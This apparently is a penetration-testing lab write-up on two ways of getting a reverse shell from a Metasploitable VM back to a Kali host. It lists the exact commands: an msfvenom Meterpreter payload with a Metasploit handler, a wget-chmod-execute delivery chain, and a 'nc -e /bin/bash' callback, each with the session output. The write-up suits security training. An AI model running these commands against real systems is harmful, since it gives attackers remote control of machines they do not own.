# 07 — Reverse Shell Delivery (msfvenom + Netcat)

Two independent reverse shell techniques were demonstrated — a full Metasploit approach and a minimal netcat approach.

---

## What is a Reverse Shell?

```
Normal:        Kali → connects to → Metasploitable
Reverse Shell: Metasploitable → calls back to → Kali
```

**Why reverse?** Firewalls usually block incoming connections but allow outgoing — reverse shells bypass firewalls.

---

## Method 1 — msfvenom + Meterpreter

### Step 1 — Generate Payload (on Kali)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.80 LPORT=4444 -f elf > shell.elf
```

| Flag | Purpose |
|------|---------|
| `-p` | Payload: Linux x86 Meterpreter reverse TCP |
| `LHOST` | Kali IP (where shell calls back) |
| `LPORT` | Kali port to listen on |
| `-f elf` | Output as Linux executable |

Result: `shell.elf` — 207 bytes.

### Step 2 — Start Listener (on Kali)
```bash
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.80; set LPORT 4444; exploit"
```
Output:
```
[*] Started reverse TCP handler on 192.168.1.80:4444
```

### Step 3 — Serve Payload (on Kali)
```bash
python3 -m http.server 8080
```

### Step 4 — Deliver & Execute (on Metasploitable via SSH)
```bash
wget http://192.168.1.80:8080/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf &
```

### Step 5 — Catch Session (on Kali)
```
[*] Sending stage (1062760 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.80:4444 → 192.168.1.50:56366)
meterpreter >
```
✅ **Full Meterpreter session — file transfer, process control, post-exploitation all available.**

---

## Method 2 — Raw Netcat Shell

A simpler approach — no Metasploit needed.

### Step 1 — Start Listener (on Kali)
```bash
nc -lvnp 4444
```

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | Skip DNS |
| `-p 4444` | Port |

### Step 2 — Trigger Connection (on Metasploitable)
```bash
nc -e /bin/bash 192.168.1.80 4444
```

### Result (on Kali):
```
listening on [any] 4444 ...
connect to [192.168.1.80] from (UNKNOWN) [192.168.1.50] 48647
whoami
msfadmin
```
✅ **Live interactive shell obtained!**

> **Note:** Raw netcat shell is a "dumb" shell — no tab completion, `Ctrl+C` can kill the connection. Metasploit's Meterpreter is more stable and feature-rich.

---

## Comparison

| Aspect | Meterpreter (Method 1) | Netcat (Method 2) |
|--------|----------------------|-------------------|
| Setup complexity | Higher | Lower |
| Session features | File transfer, pivoting, migration | Raw command execution only |
| Stability | More robust | Fragile |
| Dependencies | None beyond executing ELF | Requires netcat with `-e` support |

Both methods successfully demonstrated **remote code execution** against the target.
